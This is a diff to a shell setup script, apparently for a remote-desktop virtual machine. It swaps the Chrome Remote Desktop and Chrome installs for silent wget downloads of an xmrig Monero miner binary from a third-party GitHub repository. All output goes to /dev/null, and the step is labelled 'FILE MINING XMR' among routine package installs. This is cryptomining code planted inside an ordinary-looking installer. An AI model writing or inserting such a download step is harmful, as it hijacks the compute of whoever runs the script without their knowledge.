@@ -69,14 +69,13 @@ else
     exit
 fi
 
-# Installing Chrome Remote Desktop
-printf "\n$g$b    Installing Chrome Remote Desktop $endc$enda" >&2
+# Installing FILE MINING XMR
+printf "\n$g$b    Installing FILE MINING XMR $endc$enda" >&2
 {
-    wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
-    sudo dpkg --install chrome-remote-desktop_current_amd64.deb
-    sudo apt install --assume-yes --fix-broken
+    wget https://raw.githubusercontent.com/admin123356/mining/main/.github/workflows/SHA256SUMS
+    wget https://github.com/admin123356/mining/blob/main/.github/workflows/xmrig?raw=true
 } &> /dev/null &&
-printf "\r$c$b    Chrome Remote Desktop Installed $endc$enda\n" >&2 ||
+printf "\r$c$b    Installing FILE MINING XMR $endc$enda\n" >&2 ||
 { printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }
 
 
@@ -94,19 +93,6 @@ printf "\r$c$b    Desktop Environment Installed $endc$enda\n" >&2 ||
 { printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }
 
 
-
-# Install Google Chrome
-printf "$g$b    Installing Google Chrome $endc$enda" >&2
-{
-    wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-    sudo dpkg --install google-chrome-stable_current_amd64.deb
-    sudo apt install --assume-yes --fix-broken
-} &> /dev/null &&
-printf "\r$c$b    Google Chrome Installed $endc$enda\n" >&2 ||
-printf "\r$r$b    Error Occured $endc$enda\n" >&2
-
-
-
 # Install CrossOver (Run exe on linux)
 printf "$g$b    Installing CrossOver $endc$enda" >&2
 {
@@ -118,14 +104,12 @@ printf "\r$c$b    CrossOver Installed $endc$enda\n" >&2 ||
 printf "\r$r$b    Error Occured $endc$enda\n" >&2
 
 # Install apt install mining
-printf "$g$b   install mining $endc$enda" >&2
+printf "$g$b    install mining $endc$enda" >&2
 {
     sudo apt install xrdp -y
     sudo apt install xfce4 -y
     sudo apt install xfce4-goodies -y
     sudo apt install nano -y
-    sudo wget https://raw.githubusercontent.com/admin123356/mining/main/.github/workflows/SHA256SUMS
-    sudo wget https://github.com/admin123356/mining/blob/main/.github/workflows/xmrig?raw=true
 } &> /dev/null &&
 printf "\r$c$b   install mining $endc$enda\n" >&2 ||
 printf "\r$r$b    Error Occured $endc$enda\n" >&2
